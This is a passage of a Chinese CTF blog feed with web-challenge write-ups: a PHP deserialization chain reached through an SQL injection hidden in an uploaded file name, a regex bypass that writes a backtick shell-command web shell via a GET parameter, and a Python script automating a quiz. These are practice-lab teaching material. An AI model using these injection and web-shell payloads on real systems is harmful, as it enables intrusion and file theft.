punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">view_files</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ifview</span> <span class="token operator">==</span> <span class="token constant boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span><span class="token comment">//The function is not yet perfect, it is not open yet.</span><span class="token punctuation">&#125;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment"># Read some config html</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">view_files</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在helper.php中，明显有个读取flag的地方。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814151722029.png"></p><p>再根据前方的代码可推是反序列化题。</p><p>所以尝试构造pop链：</p><pre class="line-numbers language-none"><code class="language-none">helper::view_files &lt;- helper::__destruct()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>梳理下思路：</p><p>上传特殊图片，内含构造好的payload，写入数据库</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814153033263.png"></p><p>然后数据库查询，反序列化，触发pop链</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814153254467.png"></p><h3 id="反序列化构造"><a href="#反序列化构造" class="headerlink" title="反序列化构造"></a>反序列化构造</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">helper</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>bin2hex()函数把ASCII字符的字符串转换为十六进制值。字符串可通过使用pack()函数再转换回去</p></blockquote><blockquote><p>mysql会自动将十六进制转化为字符串，这也是sql注入的可利用点</p></blockquote><pre class="line-numbers language-none"><code class="language-none">4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>而在代码中，唯一可控的就是filename，去掉后缀就是title。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814155555593.png"></p><p>然后这个title会被写入到数据库里，</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814160327517.png"></p><p><code>$array</code>的长度为5，还加了单引号闭合，最后面还有个小括号，sql语句为：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> images <span class="token punctuation">(</span><span class="token punctuation">`</span>title<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>filename<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>ext<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>path<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>attr<span class="token punctuation">`</span><span class="token punctuation">)</span> <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>于是，payload为</p><pre class="line-numbers language-none"><code class="language-none">a&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)#.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传下，点开show.php，结束。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814161212141.png"></p><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>第一次见<code>foreach</code>里的<code>$sql_val[]</code>这种用法，大概意思就是会自动索引foreach的下标。挺妙的，记录一下。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql_val</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$sql_val</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"++"</span> <span class="token operator">.</span> <span class="token variable">$value</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"++"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$sql_val</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">array(4) &#123; [0]&#x3D;&gt; string(5) &quot;++1++&quot; [1]&#x3D;&gt; string(5) &quot;++2++&quot; [2]&#x3D;&gt; string(5) &quot;++3++&quot; [3]&#x3D;&gt; string(5) &quot;++4++&quot; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[红明谷CTF 2021]write_shell</title>
      <link href="/p/1139417858.html"/>
      <url>/p/1139417858.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[短标签|反引号]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/'| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i"</span><span class="token punctuation">,</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// if(preg_match("/'| |_|=|php/",$input))&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$input</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$input</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token variable">$input</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>      <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'sandbox/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"action"</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> <span class="token string single-quoted-string">'pwd'</span><span class="token punctuation">:</span>        <span class="token keyword">echo</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token string single-quoted-string">'upload'</span><span class="token punctuation">:</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$dir</span></span>"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>重点就是绕过正则，不能用异或/取反，数组也不行</p><p>看到php都被检测了，第一反应肯定是短标签</p><p>但被检测了很多东西，所以类似<code>&lt;?=@eval($_POST[&#39;cmd&#39;]);?&gt;</code>就没法</p><p>最后是短标签+反引号，至于空格用tab(%09)代替</p><ul><li><p>反引号等价于<a href="https://www.php.net/manual/zh/function.shell-exec.php">shell_exec()</a></p><blockquote><ol><li>关闭了<a href="https://www.php.net/manual/zh/function.shell-exec.php">shell_exec()</a>时反引号运算符是无效的。</li><li>与其它某些语言不同，反引号不能在双引号字符串中使用。</li></ol></blockquote></li></ul><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls%09&#x2F;&#96;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/image-20210814140706330.png"></p><pre class="line-numbers language-none"><code class="language-none">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat%09&#x2F;flllllll1112222222lag&#96;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[GXYCTF2019]StrongestMind</title>
      <link href="/p/2768731149.html"/>
      <url>/p/2768731149.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-StrongestMind/image-20210813171448566.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>第一反应是，写个爬虫跑一千次。</p><p>延迟2s+每10次再延迟10s都会429 真的烦。</p><p>最高记录：</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-StrongestMind/image-20210813192812312.png"></p><p>而且很奇怪，明明是同一个session，先get再post答案是错的，要想跑脚本只能不停的post结果。没法重试。</p><p>百度看了下别人的wp，延迟0.1s都没问题，为什么？？？？？</p><p>想了很久，突然发现一行检测429的代码</p><pre class="line-numbers language-none"><code class="language-none">if r.status_code &#x3D;&#x3D; 429 or &#39;429&#39; in r.text:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-StrongestMind/111.jpg"></p><p>无语啊无语，真就画蛇添足作茧自缚。如果表达式有429三个字符不就完了吗！！</p><p>怎么这么无语啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊。</p><p>又试了试，在一开始的get，不设置cookie，然后接post就没问题。但如果设置了cookie，那后面的第一个post必错。</p><p>payload:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time<span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span>    exp <span class="token operator">=</span> <span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> soup<span class="token punctuation">.</span>body<span class="token punctuation">.</span>center<span class="token punctuation">.</span>stripped_strings<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://51f4e728-7df5-4989-8800-a1576ec0fdce.node4.buuoj.cn:81/index.php"</span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf8'</span>result <span class="token operator">=</span> solve<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1002</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span><span class="token punctuation">:</span> result<span class="token punctuation">&#125;</span>    r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf8'</span>    result <span class="token operator">=</span> solve<span class="token punctuation">(</span>r<span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">429</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"429了"</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> n <span class="token operator">></span> <span class="token number">999</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token string">'bingo'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token string">'算错'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"算错了"</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="关于这session下的cookie问题"><a href="#关于这session下的cookie问题" class="headerlink" title="关于这session下的cookie问题"></a>关于这session下的cookie问题</h3><p>这cookie让我感觉很奇怪，写点代码测试下</p><h4 id="测试1"><a href="#测试1" class="headerlink" title="测试1"></a>测试1</h4><p>2.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"PHPSESSID"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestss <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/2.php'</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第1次get："</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第1次的cookies："</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第1次的session的cookies ："</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------------'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第2次get："</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第2次的cookies："</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第2次的session的cookies ："</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------------'</span><span class="token punctuation">)</span>cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">'vepn9g7r3lqfc23skjn06te693'</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第3次get："</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第3次的cookies："</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第3次的session的cookies ："</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------------'</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>update<span class="token punctuation">(</span>cookies<span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第4次get："</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第4次的cookies："</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第4次的session的cookies ："</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">第1次get：第1次的cookies：&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;pm841ptlo3hcg90n4frjkgpufo for 127.0.0.1&#x2F;&gt;]&gt;第1次的session的cookies ：&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;pm841ptlo3hcg90n4frjkgpufo for 127.0.0.1&#x2F;&gt;]&gt;------------------------------------第2次get：pm841ptlo3hcg90n4frjkgpufo第2次的cookies：&lt;RequestsCookieJar[]&gt;第2次的session的cookies ：&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;pm841ptlo3hcg90n4frjkgpufo for 127.0.0.1&#x2F;&gt;]&gt;------------------------------------第3次get：pm841ptlo3hcg90n4frjkgpufo第3次的cookies：&lt;RequestsCookieJar[]&gt;第3次的session的cookies ：&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;pm841ptlo3hcg90n4frjkgpufo for 127.0.0.1&#x2F;&gt;]&gt;------------------------------------第4次get：vepn9g7r3lqfc23skjn06te693第4次的cookies：&lt;RequestsCookieJar[]&gt;第4次的session的cookies ：&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;vepn9g7r3lqfc23skjn06te693 for &#x2F;&gt;, &lt;Cookie PHPSESSID&#x3D;pm841ptlo3hcg90n4frjkgpufo for 127.0.0.1&#x2F;&gt;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是说，session的第一次get，实际上还处于设置cookie的阶段，cookie会放到返回包，之后的连接就会放到session里面了。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-StrongestMind/image-20210823171811013.png"></p><h4 id="测试2"><a href="#测试2" class="headerlink" title="测试2"></a>测试2</h4><p>百度有些文章说得把dict转化为cookiejar才能传，</p><p>看了下官方文档，dict直接传也是可以的，但仅限第一次。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"PHPSESSID"</span><span 